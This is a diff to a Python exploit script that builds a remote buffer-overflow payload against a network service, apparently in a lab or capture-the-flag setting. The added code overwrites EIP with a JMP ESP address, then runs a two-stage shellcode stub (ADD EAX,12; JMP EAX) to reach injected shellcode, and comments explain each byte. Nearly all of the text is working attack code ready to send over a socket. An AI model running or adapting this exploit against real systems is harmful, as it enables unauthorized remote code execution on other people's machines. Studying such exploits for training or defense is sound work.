@@ -44,8 +44,6 @@ def pwn(ip, port, payload):
         data = s.recv(1024)
         print("[*] Banner: {}".format(data.strip(), end=''))
         s.send(buf)
-        data = s.recv(1024)
-        print("[*] Data: {}".format(data.strip()))
         print("[*] Done")
     except socket.timeout:
         print("[*] ERROR: Socket timeout at {} seconds... aborting".format(timeout))
@@ -157,29 +155,47 @@ def breakpoint(offset):
 
     """
     print("[*] Payload set to breakpoint on entry to shellcode section")
+
     buf = '\x11(setup sound ' 
-    buf += '\x41' * offset
-    buf += struct.pack('<L', 0xffffffff)
-    buf += '\xcc' * 7
+    buf += '\xcc' * 8                       # Break points in stage two of payload
+    buf += '\x41' * (offset - 8)            # Offset to EIP overwrite
+    buf += struct.pack('<L', 0x08134597)    # Overwrite EIP with address to JMP ESP
+    buf += '\x83\xc0\x0c'                   # ADD EAX,12 - pointer past 'setup sound'
+    buf += '\xff\xe0'                       # JMP EAX
+    buf += '\x90\x90'
     buf += '\x90\x00#'
 
     return buf
 
 
 def attack(offset, payload):
-    """ Overwrite EIP and inject shellcode
+    """ Execute stage one and stage two shellcode.
+
+    Overwriting past the range here causes the program to crash differently, so
+    there are two stages of shellcode. The EIP register is overwritten to
+    execute a JMP ESP command which brings us to the instruction directly after
+    the offset and EIP overwrite, then stage one shellcode increments the EAX
+    register which is pointing at the base of the buffer by 12 which sets it
+    to just after the '\x11(setup sound ' string. Then stage two shellcode can
+    be added to execute the desired payload.
 
     """
     print("[*] Payload set to attack")
 
     shellcode = get_shellcode(payload)
+    print("[*] Read {} byte shellcode payload".format(len(shellcode)))
 
-    buf = '\x11(setup sound '
-    buf += '\x41' * offset
-    buf += struct.pack('<L', 0xffffffff)
-    buf += '\x90' * 8
-    buf += shellcode
+    buf = '\x11(setup sound ' 
+    buf += shellcode                            # Inject shellcode
+    buf += '\x41' * (offset-len(shellcode))     # Offset to EIP overwrite
+    buf += struct.pack('<L', 0x08134597)        # Overwrite EIP with address to JMP ESP
+    buf += '\x83\xc0\x0c'                       # ADD EAX,12 - pointer past 'setup sound'
+    buf += '\xff\xe0'                           # JMP EAX - go to stage 2 (shellcode)
+    buf += '\x90\x90'                           # OPcode padding
     buf += '\x90\x00#'
+
+    crash = shellcode + "\x41" * (4368-105) + '\x97\x45\x13\x08' + "\x83\xc0\x0c\xff\xe0\x90\x90"
+    buf = '\x11(setup sound ' + crash + '\x90\x00#'
 
     return buf
 
